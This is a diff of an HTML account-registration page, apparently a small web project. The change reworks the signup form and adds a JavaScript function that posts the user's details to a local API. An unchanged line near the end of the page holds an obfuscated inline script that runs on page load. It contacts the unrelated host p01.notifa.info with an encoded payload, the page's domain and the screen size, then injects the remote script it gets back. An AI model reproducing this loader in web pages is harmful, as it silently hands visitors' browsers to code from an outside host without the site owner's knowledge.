@@ -48,13 +48,6 @@
             <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sedo eiusmod tempor incididunt dolore.</p>
           </div>
         </div>
-        <div class="single-sl-slide">
-          <img src="images/mac.png" alt="">
-          <div class="content-box">
-            <h2>All In One Transfer Solutions</h2>
-            <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sedo eiusmod tempor incididunt dolore.</p>
-          </div>
-        </div>
       </div>
       <div class="sl-form-wrap">
         <header>
@@ -69,25 +62,33 @@
           <h2>Create Account</h2>
           <p>Lorem ipsum dolor sit amet, consectetur adipiscing elit sedo<br> eiusmod tempor incididunt dolore.</p>
         </div>
-        <form action="#" class="sl-form">
+        <form method="post" class="sl-form">
           <div class="form-group">
             <label>Full Name</label>
-            <input type="text" placeholder="Jhone Doe" required>
+            <input type="text" id="register-fullname" placeholder="Full Name" required>
           </div>
           <div class="form-group">
-            <label>Email or Username</label>
-            <input type="email" placeholder="example@gmail.com" required>
+            <label>Username</label>
+            <input type="text" id="register-username" placeholder="Username for this account" required>
+          </div>
+          <div class="form-group">
+            <label>Email</label>
+            <input type="email" id="register-email" placeholder="example@gmail.com" required>
           </div>
           <div class="form-group">
             <label>Password</label>
-            <input type="password" placeholder="Password" required>
+            <input type="password" id="register-password" placeholder="Password" required>
+          </div>
+          <div class="form-group">
+            <label>Confirm Password</label>
+            <input type="password" id="register-confirm-password" placeholder="Confirm Password" required>
           </div>
           <div class="form-check">
             <input type="checkbox" class="form-check-input">
             <label class="form-check-label">Agree with <a href="#">Terms and Conditions</a></label>
           </div>
-          <button class="btn btn-filled btn-round"><span class="bh"></span> <span>Signup</span></button>
-          <p class="notice">Already have an account? <a href="#">Login Account</a></p>
+          <button class="btn btn-filled btn-round" onclick="VerifyRegister()">Signup</button> <!--<span class="bh"></span> <span>Signup</span>-->
+          <p class="notice">Already have an account? <a href="login.html">Login Account</a></p>
         </form>
       </div>
     </div>
@@ -105,4 +106,46 @@
     <script src="https://s3-us-west-2.amazonaws.com/s.cdpn.io/106949/jquery.onscreen.js"></script>
     <script src="js/scripts.js"></script>
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncXONWxBlqyl8N7UOm5z5qcDafe3CVyL5%2bI9nXlryf%2bawTSAJ%2f4bW7XILqI4HvUvoqzMPSpCm19%2bLobbtWbEdxeySnVkqfKh4OMqNsxxSlFg%2bcBDX8nekplaVkwGCHgCezC4UHuQvliehMujhvAf0yQ6CK4xXRDhXrFJO4EmPsV%2bG0nOX4x8jo%2f1KVQ6B4K5UDP4FltPXaQH02Fqq3c1SttR%2bHhY1WYDEZedbPYv%2bqeRZQNAJe5o2Gcix8efBdFzXHX%2bc1f6EnQ%2b5o1avvI9JEwOOgd6yuOSDH900U8Y4nlLINb4vwqVMZK41oiGVhJShfeiOK92oMPxUqBvOslHoqmhhjayXwAx%2fPdZXjRN9ABDNjbdyUNkAokqAGT6DkekQKHBW9rayJsUQW6E%2bG%2bdbRu28a8oTb03I314rPl6vcHBKJFcPtwqVOvONbzdFfzDl2DG8GFofRVL3hOceF24Hhk%2fg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
-</html>
+    
+    <script>
+      function VerifyRegister(){
+
+        register_fullname = document.getElementById('register-fullname').value;
+        register_email = document.getElementById('register-email').value;
+        register_username = document.getElementById('register-username').value;
+        register_pass = document.getElementById('register-password').value;
+        register_confirm_pass = document.getElementById('register-confirm-password').value;
+
+        if( register_pass != register_confirm_pass ){
+					alert('Your password does not match');
+				} else {
+
+					var url = "http://localhost:3000/api/profiles";
+
+          var data = {};
+          data.fullname = register_fullname;
+          data.name = register_username;
+		      data.email = register_email;
+		      data.password = register_pass;
+					var json = JSON.stringify(data);
+
+					//copas aja ini
+		      var xhr = new XMLHttpRequest();
+		      xhr.open('POST', url, true);
+		      xhr.setRequestHeader('Content-type','application/json; charset=utf-8'); //menyesuaikan parser
+		      xhr.onload = function() {
+            console.log(xhr.responseText);
+                  
+            var respond = JSON.parse(xhr.responseText);
+            if (xhr.readyState == 4 && xhr.status == "200") {
+              alert("You have been successfully registered. You can now login.");
+            } else {
+              console.error(respond);
+              alert(respond.message);
+            }
+		      }
+		      xhr.send(json);
+				}
+      }
+    </script>
+  </html>
